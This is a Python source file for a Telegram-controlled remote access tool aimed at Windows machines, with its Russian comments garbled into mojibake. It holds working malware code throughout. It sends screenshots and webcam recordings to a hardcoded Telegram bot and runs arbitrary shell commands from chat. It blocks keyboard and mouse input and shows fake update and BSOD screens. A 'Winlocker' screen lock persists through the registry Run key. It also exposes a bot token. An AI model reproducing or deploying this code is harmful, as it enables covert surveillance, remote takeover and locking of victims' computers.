import os
import sys
import subprocess
import time
import platform
import socket
import webbrowser
import threading
import tkinter as tk
from tkinter import messagebox
import traceback
import requests
import cv2

# –ó–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –∏ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ –∏–º –∏–º–µ–Ω–∞ –º–æ–¥—É–ª–µ–π –¥–ª—è –∏–º–ø–æ—Ä—Ç–∞
REQUIRED = {
    "pyTelegramBotAPI": "telebot",
    "pyautogui": "pyautogui",
    "Pillow": "PIL",
    "psutil": "psutil",
    "pygame": "pygame",
    "opencv-python": "cv2",
}

def try_import(module_name: str) -> bool:
    try:
        __import__(module_name)
        return True
    except Exception:
        return False

def install_package(pkg_name: str) -> bool:
    """–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–∞–∫–µ—Ç —á–µ—Ä–µ–∑ pip —Ç–æ–ª—å–∫–æ –≤ dev —Ä–µ–∂–∏–º–µ (–Ω–µ –∏–∑ .exe)."""
    if getattr(sys, "frozen", False):
        return False
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg_name])
        return True
    except Exception as e:
        print(f"Failed to install {pkg_name}: {e}", file=sys.stderr)
        return False

# –ü—Ä–æ–≤–µ—Ä—è–µ–º –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ ‚Äî –≤ —Ä–µ–∂–∏–º–µ .exe –ø—Ä–æ—Å—Ç–æ –≤—ã–≤–æ–¥–∏–º —Å–ø–∏—Å–æ–∫ –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—â–∏—Ö –∏ –≤—ã—Ö–æ–¥–∏–º
missing = []
for pkg, mod in REQUIRED.items():
    if not try_import(mod):
        missing.append((pkg, mod))

if missing:
    if getattr(sys, "frozen", False):
        names = ", ".join(p for p, _ in missing)
        msg = (
            "–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –¥–ª—è —Ä–∞–±–æ—Ç—ã .exe: " + names + "\n"
            "–°–æ–±–µ—Ä–∏—Ç–µ .exe –≤ –æ–∫—Ä—É–∂–µ–Ω–∏–∏, –≥–¥–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã —ç—Ç–∏ –ø–∞–∫–µ—Ç—ã, –∏–ª–∏ –¥–æ–±–∞–≤—å—Ç–µ –∏—Ö –≤ —Å–±–æ—Ä–∫—É PyInstaller.\n"
            "–ü—Ä–∏–º–µ—Ä: pip install " + " ".join(p for p, _ in missing)
        )
        print(msg, file=sys.stderr)
        # –î–ª—è GUI-–≤–µ—Ä—Å–∏–∏ –º–æ–∂–Ω–æ –ø–æ–∫–∞–∑–∞—Ç—å messagebox, –Ω–æ –≤ .exe –ª—É—á—à–µ –ø—Ä–æ—Å—Ç–æ –≤—ã–π—Ç–∏ —Å –∫–æ–¥–æ–º 1
        sys.exit(1)
    else:
        # Dev —Ä–µ–∂–∏–º: –ø–æ–ø—Ä–æ–±—É–µ–º —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏
        for pkg, mod in missing:
            print(f"–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é {pkg} ...")
            ok = install_package(pkg)
            if not ok:
                print(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å {pkg}.", file=sys.stderr)
                sys.exit(1)
        # –ø–æ–≤—Ç–æ—Ä–Ω—ã–π –∏–º–ø–æ—Ä—Ç –ø—Ä–æ–≤–µ—Ä–∏–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –Ω–∏–∂–µ

# –¢–µ–ø–µ—Ä—å –±–µ–∑–æ–ø–∞—Å–Ω–æ –∏–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º —Å—Ç–æ—Ä–æ–Ω–Ω–∏–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏
try:
    from PIL import Image, ImageTk, ImageGrab
    import pyautogui
    import psutil
    import cv2
    import ctypes
    import telebot
    import pygame
    import winreg
except Exception as e:
    print("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∏–º–ø–æ—Ä—Ç–µ —Å—Ç–æ—Ä–æ–Ω–Ω–∏—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫:", e, file=sys.stderr)
    if getattr(sys, "frozen", False):
        sys.exit(1)
    else:
        raise

# --- –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è ---
TOKEN = "7377054924:AAEnR9ti6y2mT3YbVMQKQbBJQpWsQWaJ6qk"
ADMIN_ID = 5782683757
bot = telebot.TeleBot(TOKEN)
user_state = {}

REQUIRED_LIBS = {
    "pyTelegramBotAPI": "telebot",
    "pyautogui": "pyautogui",
    "Pillow": "PIL",
    "psutil": "psutil",
    "pygame": "pygame",
    "opencv-python": "cv2",
}

def try_import(module_name):
    try:
        __import__(module_name)
        return True
    except ImportError:
        return False

def install_with_pip(package_name):
    # –≤—ã–∑—ã–≤–∞–µ–º pip —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –º—ã –ù–ï –≤ —É–ø–∞–∫–æ–≤–∞–Ω–Ω–æ–º exe
    if getattr(sys, "frozen", False):
        raise RuntimeError(f"–ù–µ –º–æ–≥—É —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø–∞–∫–µ—Ç '{package_name}' –∏–∑–Ω—É—Ç—Ä–∏ .exe. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –ø–∞–∫–µ—Ç –ø–µ—Ä–µ–¥ —Å–±–æ—Ä–∫–æ–π.")
    subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

missing = []
for pkg_name, module_name in REQUIRED_LIBS.items():
    if not try_import(module_name):
        missing.append(pkg_name)

if missing:
    if getattr(sys, "frozen", False):
        # –ù–∞ —ç—Ç–∞–ø–µ —É–∂–µ —É–ø–∞–∫–æ–≤–∞–Ω–Ω–æ–≥–æ exe ‚Äî –ø—Ä–æ—Å—Ç–æ —Å–æ–æ–±—â–∏—Ç—å –∏ –∑–∞–≤–µ—Ä—à–∏—Ç—å
        msg = ("–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏: " + ", ".join(missing) +
               "\n–£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –∏—Ö –≤ –æ–∫—Ä—É–∂–µ–Ω–∏–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–∞ –∏ –ø–µ—Ä–µ—Å–æ–±–µ—Ä–∏—Ç–µ .exe:\n"
               "pip install " + " ".join(missing))
        # –ø–µ—á–∞—Ç–∞–µ–º –≤ stdout/stderr –∏ –∞–∫–∫—É—Ä–∞—Ç–Ω–æ –≤—ã—Ö–æ–¥–∏–º
        print(msg, file=sys.stderr)
        # –º–æ–∂–Ω–æ —Ç–∞–∫–∂–µ –ø–æ—Å–ª–∞—Ç—å –ª–æ–≥ —á–µ—Ä–µ–∑ GUI –∏–ª–∏ –∑–∞–ø–∏—Å–∞—Ç—å –≤ —Ñ–∞–π–ª
        sys.exit(1)
    else:
        # –í dev —Ä–µ–∂–∏–º–µ ‚Äî –ø—Ä–æ–±—É–µ–º —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏
        for pkg in missing:
            print(f"–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é {pkg} ...")
            install_with_pip(pkg)
        # –ü–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –º–æ–∂–Ω–æ –ø–æ–ø—ã—Ç–∞—Ç—å—Å—è –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –∑–∞–Ω–æ–≤–æ (–æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ)
        for _, module_name in REQUIRED_LIBS.items():
            try:
                __import__(module_name)
            except ImportError as e:
                print("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∏–º–ø–æ—Ä—Ç–µ –ø–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏:", e, file=sys.stderr)
                sys.exit(1)

# --- –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é ---
def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç", "üåê –ü–æ–∏—Å–∫ –≤ –±—Ä–∞—É–∑–µ—Ä–µ")
    markup.add("üìÇ –û—Ç–∫—Ä—ã—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ", "‚ùå –ó–∞–∫—Ä—ã—Ç—å –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ")
    markup.add("‚å®Ô∏è –ù–∞–ø–µ—á–∞—Ç–∞—Ç—å —Ç–µ–∫—Å—Ç", "üñ± –ü–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å –º—ã—à—å")
    markup.add("üí¨ –°–æ–æ–±—â–µ–Ω–∏–µ", "üñ• –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö")
    markup.add("üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö", "üîí –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –ü–ö")
    markup.add("‚õî –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞", "‚å®Ô∏è –ì–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏")
    markup.add("üñ• –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è", "üëª –°–∫—Ä–∏–º–µ—Ä")
    markup.add("Black screen", "Fake update")
    markup.add("Meme spam", "üíÄ –§–µ–π–∫–æ–≤—ã–π BSOD")
    markup.add("üìπ –í–µ–±–∫–∞–º–µ—Ä–∞ 8 —Å–µ–∫", "üöÄ –ü–æ–¥–¥–µ—Ä–∂–∞—Ç—å –∞–≤—Ç–æ—Ä–∞")
    markup.add("‚ñ∂Ô∏è –ó–∞–ø—É—Å—Ç–∏—Ç—å Winlockerüîê", "‚èπ –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å WINLOCKERüîê")
    markup.add("üìÅ –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤", "üì§ –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª")
    markup.add("üìπ –í–µ–±–∫–∞–º–µ—Ä–∞ 8 —Å–µ–∫", "üì∑ –§–æ—Ç–æ —Å –≤–µ–±–∫–∞–º–µ—Ä—ã")  # –¥–æ–±–∞–≤–ª–µ–Ω–∞ –∫–Ω–æ–ø–∫–∞ —Ñ–æ—Ç–æ —Å –≤–µ–±–∫–∏
    markup.add("üîá –û—Ç–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫", "üîä –í–∫–ª—é—á–∏—Ç—å –∑–≤—É–∫")
    markup.add("üì• –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª", "üé• –°–∫—Ä–∏–Ω–∫–∞—Å—Ç 10 —Å–µ–∫")
    markup.add("üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å 100%", "üíª –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É")
    markup.add("üñº –°–º–µ–Ω–∏—Ç—å –æ–±–æ–∏", "‚è© –û–±–Ω–æ–≤–∏—Ç—å –±–æ—Ç–∞")
    markup.add("üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ –±–æ—Ç–∞", "üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –±–æ—Ç–∞")
    return markup

# --- –õ–æ–∫–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ (–ø—Ä–∏–º–µ—Ä: black screen, fake update, meme spam) ---
BASE_DIR = os.path.abspath(os.path.dirname(__file__))
MEME_DIR = os.path.join(BASE_DIR, "memes")

def local_black_screen(duration=5):
    def _run():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.configure(bg="black")
        root.attributes("-topmost", True)
        root.bind("<Escape>", lambda e: root.destroy())
        root.after(int(duration * 1000), root.destroy)
        root.mainloop()
    threading.Thread(target=_run, daemon=True).start()

def local_fake_update(duration=8, update_interval=0.5):
    def _run():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.attributes("-topmost", True)
        root.overrideredirect(True)

        screen_w = root.winfo_screenwidth()
        screen_h = root.winfo_screenheight()

        canvas = tk.Canvas(root, width=screen_w, height=screen_h, bg="#0078D7", highlightthickness=0)
        canvas.pack()

        title_font = ("Segoe UI", max(16, int(screen_h * 0.04)), "bold")
        msg_font = ("Segoe UI", max(10, int(screen_h * 0.02)))

        canvas.create_text(screen_w//2, int(screen_h*0.25), text="Installing updates", font=title_font, fill="white")
        canvas.create_text(screen_w//2, int(screen_h*0.35), text="Please do not turn off your computer.", font=msg_font, fill="white")

        bar_w = int(screen_w * 0.6)
        bar_h = max(12, int(screen_h * 0.03))
        bar_x = (screen_w - bar_w) // 2
        bar_y = int(screen_h * 0.5)
        canvas.create_rectangle(bar_x, bar_y, bar_x + bar_w, bar_y + bar_h, fill="#004c87", outline="")
        progress_rect = canvas.create_rectangle(bar_x, bar_y, bar_x, bar_y + bar_h, fill="#00c853", outline="")

        cpu_id = canvas.create_text(screen_w//2, bar_y + int(screen_h*0.06), text="CPU: --%    RAM: --%", font=msg_font, fill="white")

        start = time.time()
        def upd():
            elapsed = time.time() - start
            frac = min(1.0, elapsed / duration)
            new_w = bar_x + int(bar_w * frac)
            canvas.coords(progress_rect, bar_x, bar_y, new_w, bar_y + bar_h)
            try:
                cpu = psutil.cpu_percent(interval=None)
                ram = psutil.virtual_memory().percent
                canvas.itemconfigure(cpu_id, text=f"CPU: {int(cpu)}%    RAM: {int(ram)}%")
            except Exception:
                pass

            if elapsed < duration:
                root.after(int(update_interval * 1000), upd)
            else:
                root.destroy()

        root.after(0, upd)
        root.bind("<Escape>", lambda e: root.destroy())
        root.mainloop()

    threading.Thread(target=_run, daemon=True).start()

# ...existing code...
@bot.message_handler(func=lambda message: user_state.get(message.chat.id) == "cmd_command")
def execute_cmd_command(message):
    try:
        command = message.text.strip()
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        # –ï—Å–ª–∏ –≤—ã–≤–æ–¥ –±–æ–ª—å—à–æ–π ‚Äî –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–∫ —Ñ–∞–π–ª
        if len(result) > 3500:
            import tempfile
            tf = tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8")
            tf.write(result)
            tf.close()
            with open(tf.name, "rb") as f:
                bot.send_document(message.chat.id, f)
            os.remove(tf.name)
        else:
            bot.send_message(message.chat.id, f"‚úÖ –†–µ–∑—É–ª—å—Ç–∞—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã:\n{result}")
    except subprocess.CalledProcessError as e:
        out = e.output or str(e)
        if len(out) > 3500:
            import tempfile
            tf = tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w", encoding="utf-8")
            tf.write(out)
            tf.close()
            with open(tf.name, "rb") as f:
                bot.send_document(message.chat.id, f)
            os.remove(tf.name)
        else:
            bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥—ã:\n{out}")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {e}")
    finally:
        user_state[message.chat.id] = None


def local_meme_spam(folder=MEME_DIR, count=5, show_time=1.2):
    if not os.path.isdir(folder):
        try:
            root = tk.Tk(); root.withdraw(); messagebox.showerror("Meme spam", f"–ü–∞–ø–∫–∞ —Å –º–µ–º–∞–º–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞: {folder}"); root.destroy()
        except:
            pass
        return

    images = [os.path.join(folder, f) for f in os.listdir(folder)
              if f.lower().endswith((".png", ".jpg", ".jpeg", ".gif", ".bmp"))]
    if not images:
        try:
            root = tk.Tk(); root.withdraw(); messagebox.showerror("Meme spam", "–í –ø–∞–ø–∫–µ –Ω–µ—Ç –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–π."); root.destroy()
        except:
            pass
        return

    def _show_image(path, duration):
        try:
            root = tk.Tk()
            root.overrideredirect(True)
            root.attributes("-topmost", True)
            img = Image.open(path)
            screen_w = root.winfo_screenwidth()
            screen_h = root.winfo_screenheight()
            ratio = min(screen_w / img.width, screen_h / img.height, 1.0)
            new_w = int(img.width * ratio)
            new_h = int(img.height * ratio)
            try:
                resample = Image.Resampling.LANCZOS
            except AttributeError:
                resample = Image.ANTIALIAS
            img = img.resize((new_w, new_h), resample)
            tk_img = ImageTk.PhotoImage(img)
            lbl = tk.Label(root, image=tk_img, bg="black")
            lbl.image = tk_img
            lbl.pack()
            x = (screen_w - new_w) // 2
            y = (screen_h - new_h) // 2
            root.geometry(f"{new_w}x{new_h}+{x}+{y}")
            root.after(int(duration * 1000), root.destroy)
            root.mainloop()
        except Exception as e:
            print("Error showing meme:", e)

    def _run():
        for i, img in enumerate(images[:count]):
            _show_image(img, show_time)
            time.sleep(0.05)

    threading.Thread(target=_run, daemon=True).start()

def play_sound(file):
    def _play():
        pygame.mixer.init()
        pygame.mixer.music.load(file)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            pygame.time.Clock().tick(10)
    threading.Thread(target=_play).start()

# –°–æ–±—ã—Ç–∏–µ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
script_stop_event = threading.Event()
script_thread = None

def kiosk_gui(stop_event: threading.Event, password: str):
    add_to_autostart()
    """
    –ü–æ–ª–Ω–æ—ç–∫—Ä–∞–Ω–Ω—ã–π GUI. –ó–∞–∫—Ä—ã–≤–∞–µ—Ç—Å—è —Ç–æ–ª—å–∫–æ –ø—Ä–∏ –≤–≤–æ–¥–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –ø–∞—Ä–æ–ª—è
    –∏–ª–∏ –∫–æ–≥–¥–∞ stop_event —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –∏–∑–≤–Ω–µ (–±–æ—Ç –ø—Ä–∏—Å–ª–∞–ª –∫–æ–º–∞–Ω–¥—É –æ—Å—Ç–∞–Ω–æ–≤–∫–∏).
    """
    try:
        root = tk.Tk()
        root.title("–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ (demo)")

        root = tk.Tk()
        root.title("–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ (demo)")
        root.attributes("-fullscreen", True)
# –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ–º root.overrideredirect(True)



        def disable_event(event=None):
            return "break"

        root.protocol("WM_DELETE_WINDOW", disable_event)
        root.bind("<Alt-F4>", disable_event)

        try:
            root.grab_set()
        except Exception:
            pass

        frame = tk.Frame(root, bg="black")
        frame.pack(fill="both", expand=True)

        lbl = tk.Label(frame, text="–£–°–¢–†–û–ô–°–¢–í–û –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–û", font=("Arial", 36), fg="white", bg="black")
        lbl.pack(pady=60)

        info = tk.Label(frame, text="–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –¥–ª—è —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏", font=("Arial", 20), fg="white", bg="black")
        info.pack(pady=10)

        entry = tk.Entry(frame, show="*", font=("Arial", 24))
        entry.pack(pady=10)
        entry.focus_set()

        status = tk.Label(frame, text="", font=("Arial", 16), fg="red", bg="black")
        status.pack(pady=6)

        def check_password():
            if entry.get() == password:
                remove_from_autostart()
                try:
                    root.grab_release()
                except Exception:
                    pass
                root.destroy()
            else:
                status.config(text="–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å")
                entry.delete(0, tk.END)

        btn = tk.Button(frame, text="–†–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å", font=("Arial", 18), command=check_password)
        btn.pack(pady=20)

        def poll():
            if stop_event.is_set():
                try:
                    root.grab_release()
                except Exception:
                    pass
                try:
                    root.destroy()
                except Exception:
                    pass
                return
            try:
                root.lift()
                root.attributes("-topmost", True)
                root.after(1, lambda: root.attributes("-topmost", False))
                root.attributes("-topmost", True)
                entry.focus_force()
            except Exception:
                pass
            root.after(500, poll)

        root.after(500, poll)
        root.mainloop()

    except Exception:
        write_gui_log("GUI exception:")
        write_gui_log(traceback.format_exc())
    finally:
        stop_event.set()

def show_screamer():
    base_path = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.abspath(".")
    img_path = os.path.join(base_path, "scary.png")
    sound_path = os.path.join(base_path, "scream.mp3")
    play_sound(sound_path)
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    img = Image.open(img_path)
    img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.ANTIALIAS)
    tk_img = ImageTk.PhotoImage(img)
    label = tk.Label(root, image=tk_img)
    label.pack()
    root.after(3000, root.destroy)
    label.bind("<Button-1>", lambda e: root.destroy())
    root.mainloop()

def record_webcam(filename="webcam.mp4", duration=8):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return False
    width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(filename, fourcc, 20.0, (width, height))
    start_time = time.time()
    while time.time() - start_time < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
        else:
            break
    cap.release()
    out.release()
    return True

def show_real_bsod():
    def _run():
        root = tk.Tk()
        root.attributes("-fullscreen", True)
        root.configure(bg="black")
        root.bind("<Escape>", lambda e: root.destroy())

        canvas = tk.Canvas(root, bg="black")
        canvas.pack(fill="both", expand=True)

        screen_w = root.winfo_screenwidth()
        screen_h = root.winfo_screenheight()

        images = ["bsod1.png", "bsod2.png"]
        photo_refs = []

        for img_path in images:
            if not os.path.exists(img_path):
                continue

            img = Image.open(img_path)
            try:
                resample_mode = Image.Resampling.LANCZOS
            except AttributeError:
                resample_mode = Image.ANTIALIAS

            img_resized = img.resize((screen_w, screen_h), resample_mode)
            tk_img = ImageTk.PhotoImage(img_resized)
            photo_refs.append(tk_img)
            canvas.create_image(0, 0, anchor="nw", image=tk_img)
            root.update()
            time.sleep(2)
            canvas.delete("all")

        root.destroy()

    threading.Thread(target=_run, daemon=True).start()

def block_input(seconds):
    def _block():
        try:
            ctypes.windll.user32.BlockInput(True)
            time.sleep(seconds)
        finally:
            ctypes.windll.user32.BlockInput(False)
    threading.Thread(target=_block, daemon=True).start()

def restart_bot():
    python = sys.executable
    os.execl(python, python, *sys.argv)

def add_to_autostart():
    exe_path = sys.executable
    script_path = os.path.abspath(__file__)
    # –ï—Å–ª–∏ —Å–∫—Ä–∏–ø—Ç —É–ø–∞–∫–æ–≤–∞–Ω –≤ exe, –∏—Å–ø–æ–ª—å–∑—É–µ–º exe, –∏–Ω–∞—á–µ python + script
    if exe_path.lower().endswith("python.exe"):
        run_path = f'"{exe_path}" "{script_path}"'
    else:
        run_path = f'"{exe_path}"'
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Winlocker", 0, winreg.REG_SZ, run_path)
    winreg.CloseKey(key)

def remove_from_autostart():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "Winlocker")
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass


# --- Telegram handlers ---
@bot.message_handler(commands=["start"])
def start(message):
    if message.chat.id != ADMIN_ID:
        bot.send_message(message.chat.id, "‚õî –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω!")
        return
    bot.send_message(message.chat.id, "‚úÖ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω. –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=main_menu())

PASSWORD = "5090"  # Set your unlock password here

@bot.message_handler(func=lambda message: message.text == "üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å 100%")
def set_volume_max(message):
    try:
        ctypes.windll.winmm.waveOutSetVolume(0, 0xFFFF)  # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≥—Ä–æ–º–∫–æ—Å—Ç—å –Ω–∞ –º–∞–∫—Å–∏–º—É–º
        bot.send_message(message.chat.id, "üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å –≤—ã—Å—Ç–∞–≤–ª–µ–Ω–∞ –Ω–∞ 100%")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –∏–∑–º–µ–Ω–∏—Ç—å –≥—Ä–æ–º–∫–æ—Å—Ç—å: {e}")
        
@bot.message_handler(func=lambda message: message.text == "üñº –°–º–µ–Ω–∏—Ç—å –æ–±–æ–∏")
def change_wallpaper_request(message):
    bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å—Ç–µ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≤ –∫–∞—á–µ—Å—Ç–≤–µ –æ–±–æ–µ–≤ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞.")

@bot.message_handler(content_types=["photo"])
def set_wallpaper(message):
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        wallpaper_path = os.path.join(BASE_DIR, "wallpaper.jpg")
        with open(wallpaper_path, "wb") as f:
            f.write(downloaded_file)

        # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –æ–±–æ–∏
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)
        bot.send_message(message.chat.id, "‚úÖ –û–±–æ–∏ —Ä–∞–±–æ—á–µ–≥–æ —Å—Ç–æ–ª–∞ —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω—ã.")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ –æ–±–æ–µ–≤: {e}")

@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    global script_thread, script_stop_event  # <-- Add this line
    if message.text == "üíÄ —Ç–µ—Å—Ç":
        show_real_bsod()
        bot.send_message(message.chat.id, "üíÄ –§–µ–π–∫–æ–≤—ã–π BSOD –∑–∞–ø—É—â–µ–Ω –Ω–∞ 10 —Å–µ–∫—É–Ω–¥!")

    elif message.text == "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç":
        screenshot = ImageGrab.grab()
        path = "screenshot.png"
        screenshot.save(path)
        with open(path, "rb") as img:
            bot.send_photo(message.chat.id, img)

    # --- –î–æ–±–∞–≤–ª–µ–Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤ CMD ---
    elif message.text == "üíª –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É":
        if message.chat.id != ADMIN_ID:
            bot.send_message(message.chat.id, "‚õî –£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —ç—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã.")
            return
        bot.send_message(message.chat.id, "–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è (–±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –≤ shell):")
        user_state[message.chat.id] = "cmd_command"

    elif message.text == "Fake update":
        bot.send_message(message.chat.id, "–§–µ–π–∫ –∞–ø–¥–µ–π—Ç –∑–∞–ø—É—â–µ–Ω!")
        local_fake_update(duration=10)

    elif message.text == "üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫ –±–æ—Ç–∞":
        bot.send_message(message.chat.id, "‚ôªÔ∏è –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞—é –±–æ—Ç–∞...")
        restart_bot()

    elif message.text == "üíÄ –§–µ–π–∫–æ–≤—ã–π BSOD":
        show_real_bsod()
        bot.send_message(message.chat.id, "üíÄ –§–µ–π–∫–æ–≤—ã–π BSOD –∑–∞–ø—É—â–µ–Ω!")

    elif message.text == "‚õî –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞":
        block_input(10)
